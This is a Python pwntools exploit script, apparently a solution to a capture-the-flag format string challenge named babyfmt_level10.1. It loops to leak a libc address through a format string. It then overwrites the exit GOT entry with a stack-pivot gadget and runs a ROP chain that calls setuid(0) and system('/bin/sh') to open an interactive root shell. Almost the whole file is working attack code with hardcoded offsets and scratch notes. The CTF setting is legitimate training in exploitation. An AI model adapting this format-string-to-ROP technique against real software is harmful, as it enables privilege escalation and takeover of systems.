from pwn import *
context.binary = "/challenge/babyfmt_level10.1"
context.terminal = ['tmux','splitw','-h']
exit_got = 0x404068
pop_rdi = 0x00000000004015d3
func = 0x4012c1
ret = 0x000000000040101a
#p = process()
while True:
    #p = gdb.debug("/challenge/babyfmt_level10.1")
    p = process()
    payload = b'%18$p'
    payload += b'A' +bytes('%{}c%61$hn'.format(4717).ljust(13,'.'),'utf-8') + p64(exit_got)
    p.sendline(payload)
    try:
        p.recvuntil(b'Your input is:')
        p.recvline()
        leak = int(p.recvuntil(b'A').decode().strip('A'),base=16) -0x1db580
        temp = hex(leak) #+ 0x18ba8
        #print(temp[2:4])
        if temp[-3:] == '000' and temp[2:4] == '7f': 
            log.info("Leak libc: %s", hex(leak))
            break
        else: pass
    except Exception:
        pass
    p.close()
p.recv()
time.sleep(1)
add_rsp_0x418 = leak + 0xf9fcd #-0x4ff+16
setuid = leak+0xc2150
bin_sh = leak + 0x1925bd
system_func = leak + 0x30290
payload2 = b'A'*3
payload2 += fmtstr_payload(59,{exit_got:add_rsp_0x418},72) + cyclic(0x1f0)
payload2 += p64(pop_rdi) + p64(0) + p64(setuid) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system_func) #b'B'*16 + b'C'*16 + b'D'*16
p.sendline(payload2)
p.interactive()
#input: 48 (3), 49
#-0x5f
#5270: ret to func
#-0x490
#add rsp, 0x418: libc base + 0xF9FCD
#padding: 69

